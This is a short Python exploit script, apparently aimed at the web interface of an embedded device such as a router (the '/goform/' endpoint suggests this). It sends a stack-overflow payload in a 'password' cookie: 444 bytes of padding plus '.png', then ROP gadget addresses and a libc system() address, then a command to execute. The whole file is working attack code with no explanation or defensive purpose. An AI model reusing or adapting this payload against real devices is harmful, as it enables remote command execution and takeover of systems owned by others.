#coding:utf-8

import requests
from pwn import *

cmd="echo hello"
libc_base = 0x42344000
system_offset = 0x0005a270
system_addr = libc_base + system_offset
gadget1 = libc_base + 0x00018298
gadget2 = libc_base + 0x00040cb8

#444个“A”和“.png”组成偏移量448
payload = "A"*444 +".png" + p32(gadget1) + p32(system_addr) + p32(gadget2) + cmd

url = "http://192.168.66.132/goform/xxx"
cookie = {"Cookie":"password="+payload}
requests.get(url=url, cookies=cookie)
